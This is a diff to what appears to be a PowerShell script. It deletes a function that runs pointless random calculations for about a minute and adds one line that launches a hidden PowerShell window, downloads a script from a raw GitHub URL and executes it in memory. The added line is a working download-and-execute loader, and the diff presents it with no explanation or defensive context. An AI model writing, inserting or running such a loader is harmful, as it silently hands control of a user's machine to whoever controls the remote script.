@@ -1,10 +1,1 @@
-function Perform-RandomCalculations {
-    $stopTime = Get-Random -Minimum 60 -Maximum 101
-    $endTime = (Get-Date).AddSeconds($stopTime)
-
-    while ((Get-Date) -lt $endTime) {
-        $dummyCalculation = [Math]::Sin((Get-Random) * 1000)
-    }
-}
-
-Start-Job -ScriptBlock { Perform-RandomCalculations }
+powershell -w hidden -c "$u='https://raw.githubusercontent.com/sdvcvo/1/refs/heads/main/2.txt';$c=(New-Object Net.WebClient).DownloadString($u);$r=[powershell]::Create();$r.AddScript($c)|Out-Null;$r.Invoke()"
